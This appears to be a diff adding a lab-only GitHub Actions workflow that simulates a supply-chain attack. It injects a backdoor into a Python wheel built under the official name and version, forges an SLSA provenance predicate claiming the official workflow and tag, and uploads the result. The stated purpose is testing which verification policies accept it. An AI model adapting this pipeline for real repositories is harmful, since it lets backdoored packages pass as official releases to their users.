@@ -1,0 +1,61 @@
+# LAB ONLY - attack simulation. Run it manually: Actions > "LAB ONLY - rogue attestation" > Run workflow.
+# Scenario: an insider (or a stolen maintainer token) adds this workflow to the
+# official repository. It builds a BACKDOORED wheel that has the same file name
+# and version as the official one, then produces two attestations:
+#   1. an honest one  -> the certificate names THIS workflow as the signer;
+#   2. a forged one   -> the predicate CLAIMS the official workflow and tag v0.1.0.
+# Question for the lab: which verification policies accept this wheel?
+name: "LAB ONLY - rogue attestation"
+
+on:
+  workflow_dispatch:
+
+permissions: {}
+
+jobs:
+  rogue:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+      attestations: write
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v5
+        with:
+          persist-credentials: false
+
+      - name: Set up Python
+        uses: actions/setup-python@v6
+        with:
+          python-version: "3.12"
+
+      - name: Inject a backdoor (unit tests are skipped on purpose)
+        run: python attacks/inject_backdoor.py
+
+      - name: Build the backdoored wheel
+        run: bash scripts/build.sh
+
+      - name: "Attestation 1: honest provenance"
+        uses: actions/attest@v4
+        with:
+          subject-path: dist/*.whl
+
+      - name: Forge a predicate claiming the official workflow and tag
+        run: python attacks/forge_github_predicate.py > forged-predicate.json
+
+      - name: "Attestation 2: forged SLSA predicate"
+        uses: actions/attest@v4
+        with:
+          subject-path: dist/*.whl
+          predicate-type: https://slsa.dev/provenance/v1
+          predicate-path: forged-predicate.json
+
+      - name: Upload the rogue wheel
+        uses: actions/upload-artifact@v6
+        with:
+          name: rogue-dist
+          path: |
+            dist/
+            forged-predicate.json
+          if-no-files-found: error
